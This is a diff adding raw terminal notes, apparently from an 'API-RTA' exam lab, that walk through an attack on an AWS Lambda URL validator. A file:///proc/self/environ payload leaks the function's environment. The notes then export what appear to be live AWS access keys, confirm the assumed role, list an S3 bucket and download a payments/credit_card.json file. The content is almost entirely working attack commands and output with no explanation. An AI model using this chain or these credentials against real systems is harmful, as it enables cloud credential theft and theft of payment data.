@@ -1,0 +1,38 @@
+ curl "https://example.lambda-url.ap-south-1.on.aws/validate" \                            
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"url":"file:///proc/self/environ"}' \
+  -v --output file.txt
+
+
+
+  cat file.txt                                                                           
+AWS_LAMBDA_FUNCTION_VERSION=$LATESTAWS_EXECUTION_ENV=AWS_Lambda_python3.14AWS_DEFAULT_REGION=ap-south-1AWS_LAMBDA_LOG_STREAM_NAME=2026/01/02/[$LATEST]6238dc9cd5d742e48ead3025a102fc46AWS_REGION=ap-south-1PWD=/var/task_LAMBDA_TELEMET
+
+
+export AWS_ACCESS_KEY_ID="ASIAVK7PWCLWQ6V2L6XU"
+
+
+export AWS_SECRET_ACCESS_KEY="m1n3I+2lHfUsRRAF6KZj9PFDAHa8l8b6GAeJ6N7t"
+
+
+└─$ export AWS_DEFAULT_REGION="ap-south-1"
+
+
+
+┌──(kali㉿kali)-[~/Downloads/API-RTA]
+**└─$ aws sts get-caller-identity
+
+{
+    "UserId": "exaple:API-RTA-Exam-Lab",
+    "Account": "367185498861",
+    "Arn": "arn:aws:sts::367185498861:assumed-role/API-RTA-Exam-Lab-role-anja4tar/API-RTA-Exam-Lab"
+}
+**
+
+
+$ aws s3 ls s3://api-rta-exam-bucket-283478237498/
+
+
+aws s3 cp s3://api-rta-exam-bucket-283478237498/payments/credit_card.json . 
+download: s3://api-rta-exam-bucket-283478237498/payments/credit_card.json to ./credit_card.json копируем файлы к себе на машину
